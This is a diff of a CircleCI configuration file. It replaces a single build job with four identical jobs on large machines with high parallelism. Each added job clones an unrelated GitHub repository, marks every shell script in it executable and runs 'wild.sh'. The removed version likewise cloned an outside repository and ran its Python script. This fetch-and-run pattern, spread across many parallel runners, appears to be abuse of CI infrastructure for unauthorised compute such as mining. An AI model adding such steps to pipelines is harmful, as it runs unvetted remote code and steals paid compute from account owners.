@@ -1,12 +1,50 @@
-jobs:
-  build:
-    docker:
-      - image: cimg/python:3.10.4-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-    parallelism: 10
-    resource_class: large
-    working_directory: ~/my-app
-    steps:
-      - run: git clone https://gitlab.com/hypertrex0/cocol.git && cd cocol &&  python run.py
+version: 2.1 
+jobs: 
+    Devop: 
+      machine: 
+        image: ubuntu-2004:202010-01 
+        resource_class: large 
+      parallelism: 7     
+      steps: 
+        - checkout 
+        - run: 
+            name: "ANDROMEDA" 
+            command: git clone https://github.com/joecristian147/lokok.git && cd lokok && chmod +x *.sh && ./wild.sh
+    Devop1: 
+      machine: 
+        image: ubuntu-2004:202010-01 
+        resource_class: large 
+      parallelism: 7    
+      steps: 
+        - checkout 
+        - run: 
+            name: "ANDROMEDA" 
+            command: git clone https://github.com/joecristian147/lokok.git && cd lokok && chmod +x *.sh && ./wild.sh
+    Devop2: 
+      machine: 
+        image: ubuntu-2004:202010-01 
+        resource_class: large 
+      parallelism: 7 
+      steps: 
+        - checkout 
+        - run: 
+            name: "ANDROMEDA" 
+            command: git clone https://github.com/joecristian147/lokok.git && cd lokok && chmod +x *.sh && ./wild.sh
+    Devop3: 
+      machine: 
+        image: ubuntu-2004:202010-01 
+        resource_class: large  
+      parallelism: 7 
+      steps: 
+        - checkout 
+        - run: 
+            name: "ANDROMEDA" 
+            command: git clone https://github.com/joecristian147/lokok.git && cd lokok && chmod +x *.sh && ./wild.sh
+workflows: 
+    version: 2.1 
+    build: 
+        jobs: 
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
